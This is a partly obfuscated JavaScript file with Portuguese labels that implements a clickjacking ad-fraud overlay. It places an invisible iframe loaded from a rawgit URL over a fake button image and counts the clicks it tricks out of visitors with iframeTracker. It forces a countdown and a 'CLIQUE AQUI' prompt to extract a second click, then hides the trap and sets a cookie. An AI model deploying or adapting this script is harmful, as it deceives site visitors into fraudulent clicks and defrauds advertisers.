var modal;
var box;
var adsVideo;
var qtdCliques=0;
var intervalClique1;
var segundos=20;
var p1;var p2;
var botao;
if(recuperaCookie("clique"))	
    {	
	initAbaixaCTR()
}
else	
	{	initScript()
};
function initScript()	
    {	
    criaModal();	
    criaBox();	
    criaImagemBotao();	
    criaAdsVideo();	
    rastrearClique();	
    intervalShow()
}
function criaModal()
	{
	modal=document["createElement"]("div");
	$(modal)["attr"]("id","modal");	
	$(modal)["css"]("position","fixed");	
	$(modal)["css"]("width","100%");	
	$(modal)["css"]("height","100%");	
	$(modal)["css"]("backgroundColor","black");	
	$(modal)["css"]("top","0px");	
	$(modal)["css"]("left","0px");	
	$(modal)["css"]("opacity","0.2");	
	$(modal)["css"]("zIndex","2147483644");	
	$(modal)["hide"]();	
	$("body")["append"](modal)
}
function criaBox()
	{
	p1=document["createElement"]("p");
	$(p1)["css"]("display","block");	
	$(p1)["css"]("textAlign","center");	
	$(p1)["css"]("fontSize","60px");	
	$(p1)["css"]("fontFamily","Verdana");	
	$(p1)["css"]("margin-top","50px");	
	$(p1)["css"]("top","50px");	
	p2=document["createElement"]("p");	
	$(p2)["css"]("display","block");	
	$(p2)["css"]("textAlign","center");	
	$(p2)["css"]("fontFamily","Verdana");	
	box=document["createElement"]("div");	
	$(box)["attr"]("id","boxad");	
	$(box)["css"]("position","fixed");	
	$(box)["css"]("width","350px");	
	$(box)["css"]("height","250px");	
	$(box)["css"]("top","50%");	
	$(box)["css"]("left","50%");	
	$(box)["css"]("marginLeft","-175px");	
	$(box)["css"]("marginTop","-175px");	
	$(box)["css"]("zIndex","2147483645");	
	$(box)["css"]("backgroundImage","url('"+imagemBackground["src"]+"')");	
	$(box)["append"](p2);	
	$(box)["append"](p1);	
	$(box)["hide"]();	
	$("body")["append"](box)
}
function criaAdsVideo()
	{	
	adsVideo=document["createElement"]("iframe");	
	$(adsVideo)["attr"]("id","adsVideoId");	
	adsVideo["src"]="https://cdn.rawgit.com/jhonatanwylderx/feed/master/play.php?nocache";	
	$(adsVideo)["css"]("position","absolute");	
	$(adsVideo)["css"]("width","854px");	
	$(adsVideo)["css"]("height","480px");	
	$(adsVideo)["css"]("top","0px");	
	$(adsVideo)["css"]("left","0px");	
	$(adsVideo)["css"]("zIndex","2147483647");	
	$(adsVideo)["attr"]("scrolling","no");	
	$(adsVideo)["css"]("margin","0px");	
	$(adsVideo)["css"]("padding","0px");	
	$(adsVideo)["attr"]("frameBorder",0);	
	$(adsVideo)["css"]("border",0);	
	$(adsVideo)["css"]("top","-362px");	
	$(adsVideo)["css"]("left","-240px");	
	$(adsVideo)["css"]("opacity","0");	
	$(adsVideo)["hide"]();	
	$(box)["append"](adsVideo)
}
function criaImagemBotao()
	{	
	botao=document["createElement"]("img");	
	$(botao)["attr"]("id","imagemBotao");	
	$(botao)["attr"]("src",imagemBotao["src"]);	
	$(botao)["css"]("position","absolute");	
	$(botao)["css"]("top","0px");	
	$(botao)["css"]("left","0px");	
	$(botao)["css"]("width","350px");	
	$(botao)["css"]("height","40px");	
	$(botao)["css"]("zIndex","2147483646");	
	$(botao)["css"]("margin","0px");	
	$(botao)["css"]("padding","0px");	
	$(botao)["css"]("cursor","pointer");	
	$(botao)["hide"]();	
	$(box)["append"](botao)
}
function rastrearClique()
	{	
	$("#adsVideoId")["iframeTracker"](		
		{		
		blurCallback:function()			
			{			
			++qtdCliques;			
			switch(qtdCliques)				
			    {				
			    case 1:clique1();				
			    break;				
			    case 2:clique2();				
			    break			
		    }		
	    }	
    }	
    )
}
function clique1()
	{	
	intervalClique1=setInterval(function()
		{		
		$(adsVideo)["css"]("display","none");		
		$(botao)["css"]("display","none");		
		--segundos;		
		$(p2)["text"]("Aguarde os segundos terminarem para fechar");		
		$(p1)["text"](""+segundos);		
		$(box)["css"]("backgroundColor","white");		
		$(box)["css"]("backgroundImage","none");		
		if(segundos==0)			
			{			
			clearInterval(intervalClique1);			
			flushClique()		
		}	
	}	
	,1000)
}
function clique2()
	{	
	setTimeout(function()
		{		
		console["log"]("Clique efetuado: "+qtdCliques);		
		$("#adsVideoId")["iframeTracker"](false);		
		gravaCookie("clique","sim",20);		
		setTimeout(function()			
			{			
			destroySistema()		
		}		
		,2000)	
	}	
	,0)
}
function flushClique()
	{	
	var _0xd0fax12=setInterval(function()
		{		
		if(document["activeElement"]["tagName"]=="IFRAME")
			{			
			$(p1)["text"]("CLIQUE AQUI");			
			$(p1)["css"]("cursor","pointer")		
		}		
		else			
			{			
			clearInterval(_0xd0fax12);			
			$(adsVideo)["css"]("display","inline");			
			$(botao)["css"]("display","inline");			
			$(p1)["hide"]();			
			$(p2)["hide"]()		
		}	
	}	
	,100)
}
function destroySistema()
	{	
	$(modal)["remove"]();	
	$(box)["css"]("top","0px");	
	$(box)["css"]("left","0px");	
	$(box)["css"]("margin","0px");	
	$(box)["css"]("opacity","0");	
	$(box)["css"]("width","10px");	
	$(box)["css"]("height","10px");	
	$(adsVideo)["css"]("top","0px");	
	$(adsVideo)["css"]("left","0px");	
	(adsVideo)["css"]("margin","0px");	
	$(adsVideo)["css"]("opacity","0");	
	$(adsVideo)["css"]("width","10px");	
	$(adsVideo)["css"]("height","10px")
}
function gravaCookie(_0xd0fax15,_0xd0fax16,_0xd0fax17)
	{	
	var _0xd0fax18=new Date();	
	_0xd0fax18["setTime"](_0xd0fax18["getTime"]()+(_0xd0fax17*24*60*60*1000));	
	var _0xd0fax19="expires="+_0xd0fax18["toUTCString"]();	
	document["cookie"]=_0xd0fax15+"="+_0xd0fax16+"; "+_0xd0fax19
}
function initAbaixaCTR()
	{	
	criaModal();	
	criaBox();	
	criaImagemBotao();	
	criaAdsVideo();	
	rastrearCliqueCTR();	
	intervalShow()
}
function rastrearCliqueCTR()
	{	
	$("#adsVideoId")["iframeTracker"](
		{		
		blurCallback:function()
			{			console["log"]("Clique efetuado CTR");			
			setTimeout(function()
				{				
				destroySistema()			
			}			
			,1000)		
		}	
	}	
	)
}
function intervalShow()
	{	
	setTimeout(function()
	   {		
	   $(modal)["css"]("display","block");		
	   $(box)["css"]("display","block");		
	   $(botao)["css"]("display","inline");		
	   $(adsVideo)["css"]("display","inline")	
	}	,8000)
}
